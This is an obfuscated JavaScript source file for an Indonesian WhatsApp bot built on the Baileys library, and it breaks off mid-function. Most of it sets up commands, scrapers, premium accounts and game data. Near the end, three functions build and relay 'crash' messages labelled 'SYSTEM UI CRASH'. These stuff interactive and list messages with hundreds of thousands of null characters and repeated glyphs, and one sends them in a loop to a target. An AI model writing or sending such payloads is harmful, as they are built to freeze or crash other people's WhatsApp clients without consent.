console.clear();
require("./lib/menu");
const {
  downloadContentFromMessage,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  InteractiveMessage,
  getContentType
} = require("@whiskeysockets/baileys");
const axios = require("axios");
const cheerio = require('cheerio');
const chalk = require('chalk');
const {
  color
} = require('./lib/color');
const cron = require("node-cron");
const didyoumean = require("didyoumean");
const fetch = require('node-fetch');
const fs = require('fs');
const fsx = require('fs-extra');
const gtts = require("node-gtts");
const moment = require("moment-timezone");
const ms = require("parse-ms");
const nou = require("node-os-utils");
const os = require('os');
const path = require("path");
const PhoneNumber = require('awesome-phonenumber');
const {
  randomBytes
} = require("crypto");
const speed = require("performance-now");
const similarity = require('similarity');
const translate = require("translate-google-api");
const util = require('util');
const yts = require("yt-search");
const readmore = String.fromCharCode(0x200e).repeat(0xfa1);
const {
  igdl,
  ttdl,
  fbdown,
  twitter,
  youtube
} = require('btch-downloader');
const {
  addAfkUser,
  checkAfkUser,
  getAfkId,
  getAfkPosition,
  getAfkReason,
  getAfkTime
} = require("./lib/afk");
const {
  addFilter,
  addSpam,
  isFiltered,
  isSpam,
  ResetSpam
} = require("./lib/antispam");
const {
  addPremiumUser,
  checkPremiumUser,
  expiredCheck,
  getAllPremiumUser,
  getPremiumExpired,
  getPremiumPosition
} = require("./lib/premium");
const {
  addSewaGroup,
  getSewaExpired,
  getSewaPosition,
  checkSewaExpired,
  checkSewaGroup,
  getAllSewaGroups
} = require("./lib/sewa");
const {
  exec,
  execSync,
  spawn
} = require("child_process");
const {
  toAudio,
  toPTT,
  toVideo
} = require("./lib/converter");
const {
  smsg,
  await,
  clockString,
  delay,
  enumGetKey,
  fetchBuffer,
  fetchJson,
  format,
  formatDate,
  formatp,
  generateProfilePicture,
  getBuffer,
  getGroupAdmins,
  getRandom,
  isUrl,
  json,
  logic,
  msToDate,
  parseMention,
  sizeLimit,
  runtime,
  sleep,
  sort,
  toNumber
} = require("./lib/myfunc");
const {
  CatBox,
  fileIO,
  pomfCDN,
  uploadFile
} = require("./lib/uploader");
const {
  gameSlot,
  gameCasinoSolo,
  gameMerampok,
  daily,
  transferLimit,
  transferUang,
  buy,
  setUang,
  setLimit
} = require("./lib/game");
const {
  createUser,
  createServer,
  getEggStartupCommand,
  manageServer,
  deleteServer,
  deleteUser
} = require('./lib/cpanel');
const {
  getDnsRecords,
  createDnsRecord,
  deleteDnsRecord
} = require("./lib/csubdo");
const {
  jadibot,
  stopjadibot,
  listjadibot
} = require("./jadibot");
const alightScrape = require("./lib/scrapers/alightmotion");
const BlueArchive = require('./lib/scrapers/bluearchive');
const BukaLapak = require("./lib/scrapers/bukalapak");
const chatSimi = require("./lib/scrapers/simsimi");
const fdown = require('./lib/scrapers/fdown');
const gempa = require('./lib/scrapers/bmkg');
const GDriveDl = require("./lib/scrapers/drive");
const halodoc = require("./lib/scrapers/halodoc");
const hentai = require("./lib/scrapers/hentai");
const Instagram = require('./lib/scrapers/instagram');
const jktNews = require("./lib/scrapers/jktNews");
const Kusonime = require("./lib/scrapers/kusonime");
const lyrics = require("./lib/scrapers/lyrics");
const otakuDesu = require('./lib/scrapers/otakudesu');
const pinterest = require("./lib/scrapers/pinterest");
const PlayStore = require('./lib/scrapers/playstore');
const quotesAnime = require("./lib/scrapers/quotesAnime");
const remini = require('./lib/scrapers/remini');
const savePin = require("./lib/scrapers/savepin");
const scrapeSoundCloud = require('./lib/scrapers/soundcloud');
const upscale = require('./lib/scrapers/upscale');
const {
  ffCh,
  ffChSkill,
  ffNews,
  ffPet,
  ffPetSkill
} = require("./lib/scrapers/freefire");
const {
  komiku,
  detail
} = require("./lib/scrapers/komiku");
const {
  tiktokSearchVideo,
  tiktokDownloaderVideo
} = require("./lib/scrapers/tiktok");
const {
  wallpaper,
  wikimedia,
  happymod,
  ringtone,
  umma,
  githubstalk,
  npmstalk,
  mlstalk
} = require('./lib/scrapers/scraper');
let afk = JSON.parse(fs.readFileSync("./src/afk.json"));
let ntnsfw = JSON.parse(fs.readFileSync('./src/data/function/nsfw.json'));
let bad = JSON.parse(fs.readFileSync("./src/data/function/badword.json"));
let banned = JSON.parse(fs.readFileSync('./src/data/function/banned.json'));
let blacklist = JSON.parse(fs.readFileSync("./src/data/function/blacklist.json"));
let whitelist = JSON.parse(fs.readFileSync("./src/data/function/whitelist.json"));
let premium = JSON.parse(fs.readFileSync("./src/data/role/premium.json"));
let owner = JSON.parse(fs.readFileSync("./src/data/role/owner.json"));
let sewa = JSON.parse(fs.readFileSync("./src/data/role/sewa.json"));
let contacts = JSON.parse(fs.readFileSync("./src/data/role/contacts.json"));
let userActivity = JSON.parse(fs.readFileSync("./src/data/role/user.json"));
let audionye = JSON.parse(fs.readFileSync("./media/database/audio.json"));
let setiker = JSON.parse(fs.readFileSync("./media/database/sticker.json"));
let imagenye = JSON.parse(fs.readFileSync('./media/database/image.json'));
let videonye = JSON.parse(fs.readFileSync("./media/database/video.json"));
let asahotak = {};
let caklontong = {};
let enhance = {};
let lengkapikalimat = {};
let mathgame = {};
let siapaaku = {};
let susunkata = {};
let tekateki = {};
let tebakaplikasi = {};
let tebakbendera = {};
let tebakchara = {};
let tebakff = {};
let tebakgame = {};
let tebakgambar = {};
let tebakhewan = {};
let tebakhero = {};
let tebakjkt48 = {};
let tebakkimia = {};
let tebakkabupaten = {};
let tebakkalimat = {};
let tebakkata = {};
let tebaklirik = {};
let tebaklogo = {};
let tebakml = {};
let tebaktebakan = {};
let verifyNumber = {};
try {
  let rawData = fs.readFileSync("./src/" + tempatDB);
  global.db.data = JSON.parse(rawData) || {};
} catch (_0xb7e335) {
  console.error("⚠️ Gagal memuat " + tempatDB + ", menggunakan struktur default.");
  global.db.data = {};
}
global.db.data = {
  'sticker': global.db.data.sticker || {},
  'database': global.db.data.database || {},
  'game': global.db.data.game || {},
  'others': global.db.data.others || {},
  'users': global.db.data.users || {},
  'rpg': global.db.data.rpg || {},
  'chats': global.db.data.chats || {},
  'settings': global.db.data.settings || {}
};
const time = moment.tz('Asia/Jakarta').format('HH:mm:ss');
const date = moment.tz('Asia/Jakarta').format("DD/MM/YYYY");
const time2 = moment.tz("Asia/Jakarta").format('HH:mm:ss');
let ucapanWaktu = "Selamat Malam 🌌";
if (time2 < "05:00:00") {
  ucapanWaktu = "Selamat Pagi 🌄";
} else {
  if (time2 < "11:00:00") {
    ucapanWaktu = "Selamat Pagi 🌄";
  } else {
    if (time2 < "15:00:00") {
      ucapanWaktu = "Selamat Siang 🌅";
    } else {
      if (time2 < "18:00:00") {
        ucapanWaktu = "Selamat Sore 🌇";
      } else if (time2 < "19:00:00") {
        ucapanWaktu = "Selamat Petang 🌆";
      }
    }
  }
}
async function checkBandwidth() {
  let _0x254b89 = 0x0;
  let _0x2cc46c = 0x0;
  for (let _0x1951bd of await require("node-os-utils").netstat.stats()) {
    _0x254b89 += parseInt(_0x1951bd.inputBytes);
    _0x2cc46c += parseInt(_0x1951bd.outputBytes);
  }
  return {
    'download': formatp(_0x254b89),
    'upload': formatp(_0x2cc46c)
  };
}
;
module.exports = sock = async (_0x59f5fa, _0x3f87c6, _0xf6b72d, _0x2a4418, _0x596949) => {
  try {
    const {
      type: _0x3d9acc,
      quotedMsg: _0x124120,
      mentioned: _0x21a379,
      now: _0x415830,
      fromMe: _0xfbcda3
    } = _0x3f87c6;
    const _0x4e787b = _0x3f87c6.body;
    const _0x7a39b5 = _0x3f87c6.text;
    const _0x4773c6 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(_0x4e787b) ? _0x4e787b.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : prefa;
    const _0x2bee7f = _0x4e787b.startsWith(_0x4773c6);
    const _0x4ac520 = _0x2bee7f ? _0x4e787b.slice(0x1).trim().split(" ").shift().toLowerCase() : '';
    const _0x143458 = _0x4e787b.trim().split(/ +/).slice(0x1);
    const _0xb3f81d = await _0x59f5fa.decodeJid(_0x59f5fa.user.id);
    const _0xdd1e8d = _0x3f87c6.pushName || "No Name";
    const _0x2b2627 = q = _0x143458.join(" ");
    const _0x42d59e = _0x3f87c6.quoted || _0x3f87c6;
    const _0x5dba36 = _0x42d59e.type == "buttonsMessage" ? _0x42d59e[Object.keys(_0x42d59e)[0x1]] : _0x42d59e.type == "templateMessage" ? _0x42d59e.hydratedTemplate[Object.keys(_0x42d59e.hydratedTemplate)[0x1]] : _0x42d59e.type == 'product' ? _0x42d59e[Object.keys(_0x42d59e)[0x0]] : _0x3f87c6.quoted ? _0x3f87c6.quoted : _0x3f87c6;
    const _0x3df746 = (_0x5dba36.msg || _0x5dba36).mimetype || '';
    const _0x14f228 = /image|video|sticker|audio/.test(_0x3df746);
    const _0x1be075 = _0x3f87c6.isGroup ? await _0x59f5fa.groupMetadata(_0x3f87c6.chat)["catch"](_0x1acb0f => {}) : '';
    const _0xcea8c4 = _0x3f87c6.isGroup ? _0x1be075.subject : '';
    const _0x1c92e6 = _0x3f87c6.isGroup ? await _0x1be075.participants : '';
    const _0x85e063 = _0x3f87c6.isGroup ? await getGroupAdmins(_0x1c92e6) : '';
    const _0x26a295 = _0x3f87c6.isGroup ? _0x85e063.includes(_0xb3f81d) : false;
    const _0x5312e8 = _0x3f87c6.isGroup ? _0x85e063.includes(_0x3f87c6.sender) : false;
    const _0x1c40c7 = _0x3f87c6.isGroup ? _0x1be075.owner : '';
    const _0x1397a2 = _0x3f87c6.isGroup ? (_0x1c40c7 ? _0x1c40c7 : _0x85e063).includes(_0x3f87c6.sender) : false;
    const _0x31d696 = _0x3f87c6.isGroup ? ntnsfw.includes(_0x3f87c6.chat) : false;
    if (_0x3f87c6.isGroup) {
      _0x3f87c6.metadata = await _0x59f5fa.groupMetadata(_0x3f87c6.chat);
      _0x3f87c6.admins = _0x3f87c6.metadata.participants.reduce((_0x3d42b6, _0x4cffa6) => (_0x4cffa6.admin ? _0x3d42b6.push({
        'id': _0x4cffa6.id,
        'admin': _0x4cffa6.admin
      }) : [..._0x3d42b6]) && _0x3d42b6, []);
      _0x3f87c6.isAdmin = _0x3f87c6.admins.some(_0x32a32c => _0x32a32c.id === _0x3f87c6.sender);
      _0x3f87c6.participant = _0x3f87c6.key.participant;
      _0x3f87c6.isBotAdmin = !!_0x3f87c6.admins.find(_0x16c199 => _0x16c199.id === _0xb3f81d);
    }
    const _0x1b19c3 = _0x59f5fa.user.id.split(':')[0x0];
    const _0x50da24 = _0x3f87c6.key.fromMe ? _0x59f5fa.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x59f5fa.user.id : _0x3f87c6.key.participant || _0x3f87c6.key.remoteJid;
    const _0x58c1c3 = _0x50da24.split('@')[0x0];
    const _0x320b7b = _0x1b19c3.includes(_0x58c1c3);
    const _0x28438b = checkSewaGroup(_0x3f87c6.chat);
    const _0x4aecba = blacklist.includes(_0x3f87c6.sender);
    const _0x295873 = whitelist.includes(_0x3f87c6.sender);
    const _0x103562 = checkAfkUser(_0x3f87c6.sender, afk);
    const _0x57be4b = userActivity.includes(_0x3f87c6.sender);
    const _0x18b09f = db.data && db.data.users && db.data.users[_0x3f87c6.sender] ? db.data.users[_0x3f87c6.sender].vip : false;
    const _0x2cfe7f = [_0xb3f81d, ...owner].map(_0x24bef5 => _0x24bef5.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x3f87c6.sender);
    const _0x256404 = _0x2cfe7f || checkPremiumUser(_0x3f87c6.sender, premium);
    expiredCheck(_0x59f5fa, _0x3f87c6, premium);
    checkSewaExpired(_0x59f5fa);
    let _0x22b680 = speed();
    let _0x2f9700 = speed() - _0x22b680;
    let _0x1aa5ce = await PhoneNumber('+' + _0x3f87c6.sender.replace("@s.whatsapp.net", '')).getNumber("international");
    let _0x3e4b1d = await PhoneNumber('+' + ownerNumber.replace('@s.whatsapp.net', '')).getNumber('international');
    const _0x5a60ae = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        ...(_0x3f87c6.chat ? {
          'remoteJid': "0@s.whatsapp.net"
        } : {})
      },
      'message': {
        'conversation': "👤 *" + _0xdd1e8d + "*\n📞 *" + _0x1aa5ce + '*'
      }
    };
    const _0x2044ec = {
      'key': {
        'fromMe': false,
        'participant': '0@s.whatsapp.net',
        ...(_0x3f87c6.chat ? {
          'remoteJid': "0@s.whatsapp.net"
        } : {})
      },
      'message': {
        'conversation': "📝 *Pesan Menfess Baru!* ✨"
      }
    };
    async function _0x3a091f(_0x29825a) {
      if (typereply === 'v1') {
        _0x3f87c6.reply(_0x29825a);
      } else {
        if (typereply === 'v2') {
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'contextInfo': {
              'mentionedJid': parseMention(_0x29825a),
              'forwardingScore': 0xf423f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterName': saluranName,
                'newsletterJid': saluran
              },
              'externalAdReply': {
                'showAdAttribution': true,
                'title': botName,
                'body': ownerName,
                'previewType': "PHOTO",
                'thumbnailUrl': imageUrl,
                'sourceUrl': wagc
              }
            },
            'text': _0x29825a
          }, {
            'quoted': _0x3f87c6
          });
        } else {
          if (typereply === 'v3') {
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x29825a,
              'contextInfo': {
                'mentionedJid': parseMention(_0x29825a),
                'forwardingScore': 0xf423f,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterName': saluranName,
                  'newsletterJid': saluran
                },
                'externalAdReply': {
                  'showAdAttribution': true,
                  'title': botName,
                  'body': ownerName,
                  'thumbnailUrl': imageUrl,
                  'sourceUrl': website,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x3f87c6
            });
          } else {
            if (typereply === 'v4') {
              const _0x38cb19 = {
                'contextInfo': {
                  'mentionedJid': parseMention(_0x29825a),
                  'forwardingScore': 0xf423f,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterName': saluranName,
                    'newsletterJid': saluran
                  },
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'title': ucapanWaktu,
                    'body': botName,
                    'thumbnailUrl': imageUrl,
                    'sourceUrl': website
                  }
                },
                'text': _0x29825a
              };
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x38cb19, {
                'quoted': _0x3f87c6
              });
            } else {
              if (typereply === 'v5') {
                _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'document': imageBuffer,
                  'mimetype': "application/pdf",
                  'fileName': ucapanWaktu,
                  'fileLength': 0xf4240,
                  'pageCount': 0x64,
                  'caption': _0x29825a,
                  'contextInfo': {
                    'forwardingScore': 0x3e7,
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': saluran,
                      'newsletterName': saluranName,
                      'serverMessageId': -0x1
                    }
                  }
                }, {
                  'quoted': _0x3f87c6
                });
              } else if (typereply === 'v6') {
                _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'text': _0x29825a,
                  'contextInfo': {
                    'forwardingScore': 0x3e7,
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterJid': saluran,
                      'newsletterName': saluranName,
                      'serverMessageId': -0x1
                    }
                  }
                }, {
                  'quoted': _0x3f87c6
                });
              }
            }
          }
        }
      }
    }
    ;
    const _0x6cce3e = {
      'contextInfo': {
        'forwardingScore': 0x3e7,
        'isForwarded': true,
        'forwardedNewsletterMessageInfo': {
          'newsletterJid': saluran,
          'newsletterName': saluranName,
          'serverMessageId': -0x1
        }
      }
    };
    function _0x3b018a(_0xa90bd8) {
      return _0xa90bd8.split(" ").map(_0x55fc3c => _0x55fc3c.charAt(0x0).toUpperCase() + _0x55fc3c.slice(0x1).toLowerCase()).join(" ");
    }
    ;
    function _0x48bf64(_0x17e0d5, _0x4e0eb8 = null) {
      return _0x4e0eb8 !== null ? (_0x17e0d5 = Math.ceil(_0x17e0d5), _0x4e0eb8 = Math.floor(_0x4e0eb8), Math.floor(Math.random() * (_0x4e0eb8 - _0x17e0d5 + 0x1)) + _0x17e0d5) : Math.floor(Math.random() * _0x17e0d5) + 0x1;
    }
    ;
    try {
      let _0x148eb2 = db.data.users[_0x3f87c6.sender] || {};
      if (typeof _0x148eb2 !== "object") {
        db.data.users[_0x3f87c6.sender] = {};
      }
      let _0x10fb38 = checkPremiumUser(_0x3f87c6.sender, premium);
      let _0x3a60f0 = _0x148eb2.vip ? global.limit.vip : _0x10fb38 ? global.limit.premium : global.limit.free;
      let _0x1c4d03 = _0x148eb2.vip ? global.uang.vip : _0x10fb38 ? global.uang.premium : global.uang.free;
      if (!("rpg" in _0x148eb2)) {
        _0x148eb2.rpg = false;
      }
      if (!("daftar" in _0x148eb2)) {
        _0x148eb2.daftar = false;
      }
      if (!("vip" in _0x148eb2)) {
        _0x148eb2.vip = false;
      }
      if (!("badword" in _0x148eb2)) {
        _0x148eb2.badword = 0x0;
      }
      if (!("title" in _0x148eb2)) {
        _0x148eb2.title = '';
      }
      if (!("serialNumber" in _0x148eb2)) {
        _0x148eb2.serialNumber = randomBytes(0x10).toString("hex");
      }
      if (!('nick' in _0x148eb2)) {
        _0x148eb2.nick = _0x59f5fa.getName(_0x3f87c6.sender);
      }
      if (!("nama" in _0x148eb2)) {
        _0x148eb2.nama = "Guest";
      }
      if (!("pacar" in _0x148eb2)) {
        _0x148eb2.pacar = '';
      }
      if (!("askot" in _0x148eb2)) {
        _0x148eb2.askot = '';
      }
      if (!(typeof _0x148eb2.umur === "number" && !isNaN(_0x148eb2.umur))) {
        _0x148eb2.umur = 0x0;
      }
      if (!_0x10fb38) {
        _0x148eb2.premium = false;
      }
      if (!("totalLimit" in _0x148eb2)) {
        _0x148eb2.totalLimit = _0x3a60f0;
      }
      if (!(typeof _0x148eb2.limit === "number" && !isNaN(_0x148eb2.limit))) {
        _0x148eb2.limit = _0x3a60f0;
      }
      if (!("uang" in _0x148eb2)) {
        _0x148eb2.uang = _0x1c4d03;
      }
      if (!('lastclaim' in _0x148eb2)) {
        _0x148eb2.lastclaim = new Date().getTime();
      }
      if (!('lastrampok' in _0x148eb2)) {
        _0x148eb2.lastrampok = new Date().getTime();
      }
      if (!("pctime" in _0x148eb2)) {
        _0x148eb2.pctime = '';
      }
      if (!(typeof _0x148eb2.coins === "number" && !isNaN(_0x148eb2.coins))) {
        _0x148eb2.coins = 0x0;
      }
      if (!(typeof _0x148eb2.uang === "number" && !isNaN(_0x148eb2.uang))) {
        _0x148eb2.uang = 0x0;
      }
      if (!(typeof _0x148eb2.exp === "number" && !isNaN(_0x148eb2.exp))) {
        _0x148eb2.exp = 0x0;
      }
      if (!(typeof _0x148eb2.rank === "number" && !isNaN(_0x148eb2.rank))) {
        _0x148eb2.rank = 0x2bc;
      }
      if (!(typeof _0x148eb2.level === "number" && !isNaN(_0x148eb2.level))) {
        _0x148eb2.level = 0x0;
      }
      db.data.users[_0x3f87c6.sender] = _0x148eb2;
      let _0x5b6dd1 = db.data.rpg[_0x3f87c6.sender] || {};
      if (typeof _0x5b6dd1 !== 'object') {
        db.data.rpg[_0x3f87c6.sender] = {};
      }
      if (!('kapal' in _0x5b6dd1)) {
        _0x5b6dd1.kapal = false;
      }
      if (!("darahkapal" in _0x5b6dd1)) {
        _0x5b6dd1.darahkapal = 0x64;
      }
      if (!("pickaxe" in _0x5b6dd1)) {
        _0x5b6dd1.pickaxe = false;
      }
      if (!("darahpickaxe" in _0x5b6dd1)) {
        _0x5b6dd1.darahpickaxe = 0x64;
      }
      if (!("kapak" in _0x5b6dd1)) {
        _0x5b6dd1.kapak = false;
      }
      if (!("darahkapak" in _0x5b6dd1)) {
        _0x5b6dd1.darahkapak = 0x64;
      }
      if (!("bzirah" in _0x5b6dd1)) {
        _0x5b6dd1.bzirah = false;
      }
      if (!("darahbzirah" in _0x5b6dd1)) {
        _0x5b6dd1.darahbzirah = 0x64;
      }
      if (!("pedang" in _0x5b6dd1)) {
        _0x5b6dd1.pedang = false;
      }
      if (!("darahpedang" in _0x5b6dd1)) {
        _0x5b6dd1.darahpedang = 0x64;
      }
      if (!("darahuser" in _0x5b6dd1)) {
        _0x5b6dd1.darahuser = 0x64;
      }
      if (!("rumah" in _0x5b6dd1)) {
        _0x5b6dd1.rumah = 0x0;
      }
      if (!("besi" in _0x5b6dd1)) {
        _0x5b6dd1.besi = 0x4;
      }
      if (!("kayu" in _0x5b6dd1)) {
        _0x5b6dd1.kayu = 0x2;
      }
      if (!("emas" in _0x5b6dd1)) {
        _0x5b6dd1.emas = 0x0;
      }
      if (!('perak' in _0x5b6dd1)) {
        _0x5b6dd1.perak = 0x0;
      }
      if (!("batubara" in _0x5b6dd1)) {
        _0x5b6dd1.batubara = 0x0;
      }
      if (!('bulu' in _0x5b6dd1)) {
        _0x5b6dd1.bulu = 0x0;
      }
      if (!("kain" in _0x5b6dd1)) {
        _0x5b6dd1.kain = 0x0;
      }
      if (!("wilayah" in _0x5b6dd1)) {
        _0x5b6dd1.wilayah = "Indonesia";
      }
      if (!("wilayahrumah" in _0x5b6dd1)) {
        _0x5b6dd1.wilayahrumah = "Indonesia";
      }
      if (!("musuh" in _0x5b6dd1)) {
        _0x5b6dd1.musuh = 0x0;
      }
      if (!('ikan' in _0x5b6dd1)) {
        _0x5b6dd1.ikan = 0x0;
      }
      if (!("domba" in _0x5b6dd1)) {
        _0x5b6dd1.domba = 0x0;
      }
      if (!("sapi" in _0x5b6dd1)) {
        _0x5b6dd1.sapi = 0x0;
      }
      if (!('ayam' in _0x5b6dd1)) {
        _0x5b6dd1.ayam = 0x0;
      }
      if (!("bank" in _0x5b6dd1)) {
        _0x5b6dd1.bank = 0x0;
      }
      if (!("burutime" in _0x5b6dd1)) {
        _0x5b6dd1.burutime = 0x0;
      }
      if (!('lastclaim' in _0x5b6dd1)) {
        _0x5b6dd1.lastclaim = 0x0;
      }
      if (!("lastdagang" in _0x5b6dd1)) {
        _0x5b6dd1.lastdagang = 0x0;
      }
      if (!('lastbansos' in _0x5b6dd1)) {
        _0x5b6dd1.lastbansos = 0x0;
      }
      if (!("lastkerja" in _0x5b6dd1)) {
        _0x5b6dd1.lastkerja = 0x0;
      }
      if (!("lastrampok" in _0x5b6dd1)) {
        _0x5b6dd1.lastrampok = 0x0;
      }
      db.data.rpg[_0x3f87c6.sender] = _0x5b6dd1;
      let _0x2ca3d0 = db.data.chats[_0x3f87c6.chat] || {};
      if (typeof _0x2ca3d0 !== "object") {
        db.data.chats[_0x3f87c6.chat] = {};
      }
      if (!('badword' in _0x2ca3d0)) {
        _0x2ca3d0.badword = false;
      }
      if (!("antiforeignnum" in _0x2ca3d0)) {
        _0x2ca3d0.antiforeignnum = false;
      }
      if (!("antiviewonce" in _0x2ca3d0)) {
        _0x2ca3d0.antiviewonce = false;
      }
      if (!("autoaipc" in _0x2ca3d0)) {
        _0x2ca3d0.autoaipc = false;
      }
      if (!("autoaigc" in _0x2ca3d0)) {
        _0x2ca3d0.autoaigc = false;
      }
      if (!("antibot" in _0x2ca3d0)) {
        _0x2ca3d0.antibot = false;
      }
      if (!("antispam" in _0x2ca3d0)) {
        _0x2ca3d0.antispam = false;
      }
      if (!("antimedia" in _0x2ca3d0)) {
        _0x2ca3d0.antimedia = false;
      }
      if (!("antiimage" in _0x2ca3d0)) {
        _0x2ca3d0.antiimage = false;
      }
      if (!("antivideo" in _0x2ca3d0)) {
        _0x2ca3d0.antivideo = false;
      }
      if (!("antiaudio" in _0x2ca3d0)) {
        _0x2ca3d0.antiaudio = false;
      }
      if (!('antisticker' in _0x2ca3d0)) {
        _0x2ca3d0.antisticker = false;
      }
      if (!("anticontact" in _0x2ca3d0)) {
        _0x2ca3d0.anticontact = false;
      }
      if (!("antilocation" in _0x2ca3d0)) {
        _0x2ca3d0.antilocation = false;
      }
      if (!("antidocument" in _0x2ca3d0)) {
        _0x2ca3d0.antidocument = false;
      }
      if (!('antilink' in _0x2ca3d0)) {
        _0x2ca3d0.antilink = false;
      }
      if (!("antilinkgc" in _0x2ca3d0)) {
        _0x2ca3d0.antilinkgc = false;
      }
      if (!("mute" in _0x2ca3d0)) {
        _0x2ca3d0.mute = false;
      }
      if (!("setwelcome" in _0x2ca3d0)) {
        _0x2ca3d0.setwelcome = false;
      }
      if (!('setleft' in _0x2ca3d0)) {
        _0x2ca3d0.setleft = false;
      }
      if (!("liststore" in _0x2ca3d0)) {
        _0x2ca3d0.liststore = {};
      }
      db.data.chats[_0x3f87c6.chat] = _0x2ca3d0;
      let _0x399da1 = db.data.settings[_0xb3f81d] || {};
      if (typeof _0x399da1 !== 'object') {
        db.data.settings[_0xb3f81d] = {};
      }
      if (!('totalhit' in _0x399da1)) {
        _0x399da1.totalhit = 0x0;
      }
      if (!('totalError' in _0x399da1)) {
        _0x399da1.totalError = 0x0;
      }
      if (!('online' in _0x399da1)) {
        _0x399da1.online = false;
      }
      if (!("safesearch" in _0x399da1)) {
        _0x399da1.safesearch = false;
      }
      if (!("autosticker" in _0x399da1)) {
        _0x399da1.autosticker = false;
      }
      if (!('autodownload' in _0x399da1)) {
        _0x399da1.autodownload = false;
      }
      if (!("autobio" in _0x399da1)) {
        _0x399da1.autobio = false;
      }
      if (!("autoread" in _0x399da1)) {
        _0x399da1.autoread = false;
      }
      if (!("autorecordtype" in _0x399da1)) {
        _0x399da1.autorecordtype = false;
      }
      if (!("autorecord" in _0x399da1)) {
        _0x399da1.autorecord = false;
      }
      if (!('autotype' in _0x399da1)) {
        _0x399da1.autotype = false;
      }
      if (!("autoblocknum" in _0x399da1)) {
        _0x399da1.autoblocknum = false;
      }
      if (!("onlygc" in _0x399da1)) {
        _0x399da1.onlygc = false;
      }
      if (!("onlypc" in _0x399da1)) {
        _0x399da1.onlypc = false;
      }
      if (!('watermark' in _0x399da1)) {
        _0x399da1.watermark = {
          'packname': global.packname,
          'author': global.author
        };
      }
      if (!("about" in _0x399da1)) {
        _0x399da1.about = {
          'bot': {
            'nick': _0x59f5fa.getName(_0xb3f81d),
            'alias': botName
          },
          'owner': {
            'nick': _0x59f5fa.getName(ownerNumber + "@s.whatsapp.net"),
            'alias': ownerNumber
          }
        };
      }
      db.data.settings[_0xb3f81d] = _0x399da1;
    } catch (_0x410873) {
      console.error("⚠️ Terjadi kesalahan:", _0x410873);
    }
    async function _0x1bf3a3(_0x49eb5d, _0x15b5ac) {
      for (let _0x4a6222 = 0x0; _0x4a6222 < _0x15b5ac; _0x4a6222++) {
        let _0x104fe4 = generateWAMessageFromContent(_0x49eb5d, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': ''
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': ''
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': '',
                  'subtitle': '',
                  'hasMediaAttachment': false
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                  }],
                  'messageParamsJson': "\0".repeat(0x186a0)
                })
              })
            }
          }
        }, {});
        _0x59f5fa.relayMessage(_0x49eb5d, _0x104fe4.message, {
          'messageId': _0x104fe4.key.id
        });
      }
    }
    async function _0x567613(_0x31cd84) {
      let _0x4e8295 = generateWAMessageFromContent(_0x31cd84, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
              },
              'footer': {
                'text': 'xp'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :\t}"
                }],
                'messageParamsJson': "\0".repeat(0xf4240)
              }
            }
          }
        }
      }), {
        'userJid': _0x31cd84
      });
      await _0x59f5fa.relayMessage(_0x31cd84, _0x4e8295.message, {
        'participant': {
          'jid': _0x31cd84
        },
        'messageId': _0x4e8295.key.id
      });
    }
    async function _0x1e2311(_0x48dad7) {
      let _0x332de7 = generateWAMessageFromContent(_0x48dad7, proto.Message.fromObject({
        'listMessage': {
          'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(0xe09c0),
          'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': 'lol',
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': '0@s.whatsapp.net'
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': '1679959486',
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': 'whatsapp',
